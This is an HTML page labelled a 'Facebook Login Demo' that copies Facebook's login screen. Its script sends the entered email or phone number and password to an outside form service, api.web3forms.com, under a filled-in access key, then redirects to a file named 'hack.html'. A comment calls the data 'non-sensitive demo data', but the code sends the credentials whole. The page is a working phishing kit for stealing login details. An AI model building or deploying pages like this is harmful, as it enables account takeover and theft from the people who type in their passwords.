<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login Demo</title>
<style>
  body{margin:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;}
  .container{max-width:360px;margin:100px auto;text-align:center;}
  .logo{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px;}
  form{background:#fff;padding:20px;border-radius:8px;
       box-shadow:0 2px 6px rgba(0,0,0,0.1);}
  input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;
        border-radius:6px;font-size:15px;}
  button{width:100%;padding:12px;background:#1877f2;color:#fff;
         border:none;border-radius:6px;font-size:17px;font-weight:bold;
         cursor:pointer;}
  button:hover{background:#166fe5;}
  a{text-decoration:none;color:#1877f2;font-size:14px;}
</style>
</head>
<body>

<div class="container">
  <div class="logo">facebook</div>

  <form id="fbLoginForm" method="POST" action="https://api.web3forms.com/submit">
    <!-- Replace YOUR_ACCESS_KEY with your real Web3Forms access key -->
    <input type="hidden" name="access_key" value="73749dc6-f5a4-402b-ba0e-e099741d9206">

    <input type="text" name="user" placeholder="Email address or phone number" required>
    <input type="password" name="pass" placeholder="Password" required>

    <button type="submit">Log in</button>

    <div style="margin-top:15px;">
      <a href="#">Forgotten password?</a><br><br>
      <a href="#">Create new account</a>
    </div>
  </form>
</div>

<script>
  // redirect after successful send
  document.getElementById("fbLoginForm").addEventListener("submit", function(e){
    e.preventDefault();

    // Only send non-sensitive demo data
    const formData = new FormData(this);
    fetch(this.action, {method:"POST", body:formData})
      .then(res => res.ok ? window.location.href="hack.html"
                          : alert("Error sending form"));
  });
</script>

</body>
</html>
